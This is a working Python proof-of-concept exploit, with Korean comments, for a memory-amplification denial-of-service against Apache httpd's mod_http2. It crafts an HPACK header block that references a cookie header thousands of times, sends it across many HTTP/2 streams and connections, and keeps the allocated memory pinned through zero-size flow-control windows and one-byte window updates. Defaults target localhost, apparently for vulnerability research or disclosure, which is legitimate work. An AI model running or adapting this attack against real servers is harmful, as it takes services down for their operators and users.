#!/usr/bin/env python3
import argparse
import socket
import struct
import threading
import time
from typing import Iterable, List, Tuple


# HTTP/2 통신 시작을 알림
CLIENT_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

# HTTP/2 프레임 타입 (그냥 숫자로 넣어도 되지만, 가독성을 위해 변수 선언)
FRAME_DATA = 0x0
FRAME_HEADERS = 0x1
FRAME_RST_STREAM = 0x3
FRAME_SETTINGS = 0x4
FRAME_PING = 0x6
FRAME_GOAWAY = 0x7
FRAME_WINDOW_UPDATE = 0x8
FRAME_CONTINUATION = 0x9

# 플래그 값 (동일한 값이라도 어떤 프레임 타입에 들어가냐에 따라 의미가 바뀜)
FLAG_ACK = 0x1
FLAG_END_STREAM = 0x1
FLAG_END_HEADERS = 0x4

SETTINGS_INITIAL_WINDOW_SIZE = 0x4


# HTTP/2 요청 프레임 생성
def h2_frame(frame_type: int, flags: int, stream_id: int, payload: bytes) -> bytes:
    return (
        len(payload).to_bytes(3, "big")
        + bytes([frame_type, flags])
        + struct.pack("!I", stream_id & 0x7FFFFFFF)
        + payload
    )


# hpack 헤더 블록 안에서 hpack 정수 표현을 사용해야 하는 경우의 표현
def hpack_int(value: int, prefix_bits: int, first_byte_prefix: int) -> bytes:
    max_prefix = (1 << prefix_bits) - 1

    if value < max_prefix:
        return bytes([first_byte_prefix | value])

    out = bytearray([first_byte_prefix | max_prefix])
    value -= max_prefix

    while value >= 128:
        out.append((value & 0x7F) | 0x80)
        value >>= 7

    out.append(value)
    return bytes(out)

# hpack 방식으로 문자열을 표현
def hpack_string(data: bytes) -> bytes:
    return hpack_int(len(data), 7, 0x00) + data

# static table의 특정 번호를 참조하는 헤더 표현
def indexed(index: int) -> bytes:
    return hpack_int(index, 7, 0x80)

# static table에서 헤더 가져오고 dynamic table에 저장
def literal_indexed_name_with_indexing(name_index: int, value: bytes) -> bytes:
    return hpack_int(name_index, 6, 0x40) + hpack_string(value)

# static table에서 헤더 가져오고 dynamic table에는 저장 안함
def literal_indexed_name_without_indexing(name_index: int, value: bytes) -> bytes:
    return hpack_int(name_index, 4, 0x00) + hpack_string(value)


# 공격 페이로드
def build_httpd_cookie_bomb(authority: str, path: str, refs: int) -> bytes:
    block = bytearray()

    block += indexed(2)  # :method: GET
    block += indexed(6)  # :scheme: http
    block += literal_indexed_name_without_indexing(4, path.encode())       # :path
    block += literal_indexed_name_without_indexing(1, authority.encode())  # :authority

    # HPACK static index 32 = "cookie".
    # cookie: 를 dynamic table에 한 번 저장하면 직후 dynamic index 62로 참조 가능하다.
    # 이후 indexed(62)를 refs번 반복하여 서버가 다수의 Cookie header를 복원하도록 만든다.
    block += literal_indexed_name_with_indexing(32, b"")
    block += indexed(62) * refs

    return bytes(block)

# 클라이언트에서 response body로 받을 크기를 0바이트로 제한하여 서버의 요청 처리를 지연시킴
def settings_payload(settings: Iterable[Tuple[int, int]]) -> bytes:
    return b"".join(struct.pack("!HI", key, value) for key, value in settings)


# 통신 유지용
def recv_exact(sock: socket.socket, n: int) -> bytes:
    chunks = bytearray()

    while len(chunks) < n:
        chunk = sock.recv(n - len(chunks))
        if not chunk:
            raise EOFError("socket closed")
        chunks += chunk

    return bytes(chunks)

# 통신 유지용
def read_frame(sock: socket.socket) -> Tuple[int, int, int, bytes]:
    hdr = recv_exact(sock, 9)

    length = int.from_bytes(hdr[:3], "big")
    frame_type = hdr[3]
    flags = hdr[4]
    stream_id = struct.unpack("!I", hdr[5:9])[0] & 0x7FFFFFFF
    payload = recv_exact(sock, length)

    return frame_type, flags, stream_id, payload

# 통신 유지용
def service_peer_frames(sock: socket.socket, seconds: float) -> dict:
    counts = {
        "settings": 0,
        "ping": 0,
        "goaway": 0,
        "rst": 0,
        "data": 0,
        "headers": 0,
        "other": 0,
    }

    deadline = time.monotonic() + seconds
    sock.settimeout(0.1)

    while time.monotonic() < deadline:
        try:
            frame_type, flags, _stream_id, payload = read_frame(sock)

        except socket.timeout:
            continue

        except (EOFError, OSError):
            break

        if frame_type == FRAME_SETTINGS and not (flags & FLAG_ACK):
            counts["settings"] += 1
            try:
                sock.sendall(h2_frame(FRAME_SETTINGS, FLAG_ACK, 0, b""))
            except OSError:
                break

        elif frame_type == FRAME_PING and not (flags & FLAG_ACK):
            counts["ping"] += 1
            try:
                sock.sendall(h2_frame(FRAME_PING, FLAG_ACK, 0, payload))
            except OSError:
                break

        elif frame_type == FRAME_GOAWAY:
            counts["goaway"] += 1

        elif frame_type == FRAME_RST_STREAM:
            counts["rst"] += 1

        elif frame_type == FRAME_DATA:
            counts["data"] += 1

        elif frame_type == FRAME_HEADERS:
            counts["headers"] += 1

        else:
            counts["other"] += 1

    return counts


# hpack 헤더 블록 전송
def send_header_block(
    sock: socket.socket,
    stream_id: int,
    block: bytes,
    max_frame: int = 16384,
) -> int:
    chunks = [block[i : i + max_frame] for i in range(0, len(block), max_frame)] or [b""]
    sent_frames = 0

    for i, chunk in enumerate(chunks):
        first = i == 0
        last = i == len(chunks) - 1

        frame_type = FRAME_HEADERS if first else FRAME_CONTINUATION
        flags = FLAG_END_STREAM if first else 0

        if last:
            flags |= FLAG_END_HEADERS

        sock.sendall(h2_frame(frame_type, flags, stream_id, chunk))
        sent_frames += 1

    return sent_frames

# TCP 연결 이후 HTTP/2 연결 수립 함수 (HTTP h2c 방식에서 사용하는 방법)
def connect_h2c(host: str, port: int, initial_window: int) -> socket.socket:
    sock = socket.create_connection((host, port), timeout=5)

    # h2c direct mode:
    # TCP connect -> HTTP/2 client preface -> SETTINGS
    sock.sendall(CLIENT_PREFACE)

    sock.sendall(
        h2_frame(
            FRAME_SETTINGS,
            0,
            0,
            settings_payload([(SETTINGS_INITIAL_WINDOW_SIZE, initial_window)]),
        )
    )

    service_peer_frames(sock, 1.0)
    return sock


# Window_Update 요청을 보낼 프레임 생성
def window_update_payload(amount: int) -> bytes:
    return struct.pack("!I", amount & 0x7FFFFFFF)

# Window_Update 요청을 전송 (Hpack Bomb을 처리한 후, 응답을 보내서 메모리가 풀리지 않도록 응답을 아주 조금씩 보낼 수 있게 지연시킴)
def drip_window(sock: socket.socket, stream_ids: List[int], amount: int) -> None:
    if amount <= 0:
        return

    # DATA 전송은 connection-level window와 stream-level window를 둘 다 소비한다.
    # 각 stream에 amount만큼 열어주려면 connection-level window도 stream 수만큼 열어주는 게 맞다.
    conn_amount = amount * max(1, len(stream_ids))

    sock.sendall(h2_frame(FRAME_WINDOW_UPDATE, 0, 0, window_update_payload(conn_amount)))

    for stream_id in stream_ids:
        sock.sendall(h2_frame(FRAME_WINDOW_UPDATE, 0, stream_id, window_update_payload(amount)))


# HTTP/2 통신
def run_connection(conn_id: int, args: argparse.Namespace, block: bytes) -> None:
    try:
        sock = connect_h2c(args.host, args.port, args.initial_window)
    except OSError as e:
        print(f"conn={conn_id} connect_failed={e}", flush=True)
        return

    stream_ids = [1 + 2 * i for i in range(args.streams)]

    frames = 0
    started = time.monotonic()

    try:
        for stream_id in stream_ids:
            frames += send_header_block(sock, stream_id, block)

    except OSError as e:
        print(f"conn={conn_id} send_failed={e}", flush=True)
        try:
            sock.close()
        except OSError:
            pass
        return

    elapsed = time.monotonic() - started

    print(
        f"conn={conn_id} sent_streams={len(stream_ids)} "
        f"header_block={len(block)}B frames={frames} elapsed={elapsed:.3f}s",
        flush=True,
    )

    counts = {
        "settings": 0,
        "ping": 0,
        "goaway": 0,
        "rst": 0,
        "data": 0,
        "headers": 0,
        "other": 0,
    }

    stop_at = time.monotonic() + args.hold

    while time.monotonic() < stop_at:
        remaining = max(0.0, stop_at - time.monotonic())
        interval = min(args.drip_interval, remaining) if args.drip_interval > 0 else remaining

        delta = service_peer_frames(sock, interval)

        for key, value in delta.items():
            counts[key] += value

        if args.drip_interval > 0 and time.monotonic() < stop_at:
            try:
                drip_window(sock, stream_ids, args.drip_bytes)
            except OSError:
                break
        else:
            break

    print(f"conn={conn_id} peer_frames={counts}", flush=True)

    try:
        sock.close()
    except OSError:
        pass


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Local h2c PoC for Apache httpd mod_http2 HPACK Cookie memory amplification"
    )

    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=10080)
    parser.add_argument("--server-name", default="localhost")
    parser.add_argument("--path", default="/big.bin")

    parser.add_argument("--connections", type=int, default=1)
    parser.add_argument("--streams", type=int, default=30)
    parser.add_argument("--refs", type=int, default=4091)

    parser.add_argument("--initial-window", type=int, default=0)
    parser.add_argument("--hold", type=float, default=300.0)

    parser.add_argument("--drip-interval", type=float, default=2.0)
    parser.add_argument("--drip-bytes", type=int, default=1)

    args = parser.parse_args()

    block = build_httpd_cookie_bomb(args.server_name, args.path, args.refs)

    accepted_duplicate_refs = min(args.refs, 4091)
    merge_alloc = accepted_duplicate_refs * (accepted_duplicate_refs + 1) + accepted_duplicate_refs
    final_cookie = accepted_duplicate_refs * 2

    print(
        "payload: "
        f"refs={args.refs} "
        f"path={args.path} "
        f"header_block={len(block)}B "
        f"estimated_merge_alloc={merge_alloc / 1048576:.2f}MiB "
        f"final_cookie={final_cookie}B "
        f"per_stream_wire_to_cookie_alloc={merge_alloc / max(1, len(block)):.1f}:1",
        flush=True,
    )

    threads = [
        threading.Thread(target=run_connection, args=(i, args, block), daemon=False)
        for i in range(args.connections)
    ]

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()